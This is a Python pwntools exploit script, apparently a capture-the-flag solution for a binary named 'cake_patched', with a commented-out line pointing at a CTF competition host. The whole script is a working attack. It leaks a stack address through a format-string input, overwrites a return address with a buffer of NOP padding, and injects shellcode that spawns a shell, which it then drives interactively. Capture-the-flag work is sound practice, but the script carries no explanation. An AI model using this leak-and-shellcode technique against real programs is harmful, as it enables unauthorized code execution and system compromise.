#!/usr/bin/env python3



from pwn import *
import sys

context.clear(arch="amd64")
e = ELF("./cake_patched")
r = process("./cake_patched")
#r = remote("cake.ctf.intigriti.io",9999)
r.sendlineafter(b">",b"2")
r.sendlineafter(b"What could our chef do better?",b"%8$p")
r.sendlineafter(b">",b"3")
a = asm(shellcraft.amd64.linux.sh())
leak = int(r.recvline().strip(),16)
val = hex(leak)[-2:]
val = int(str(val),16) - 0x90
if(val < 0):
    r.close()
    sys.exit()
else:
    r.sendlineafter(b">",b"1")
    exploit = b"1" + b"\x90" * 183  + p64(leak - 0x80) + b'\x90' * 16  + a + p8(val)
    r.send(exploit)
    r.recvuntil(b" Yummy!\n\n")
    r.interactive()
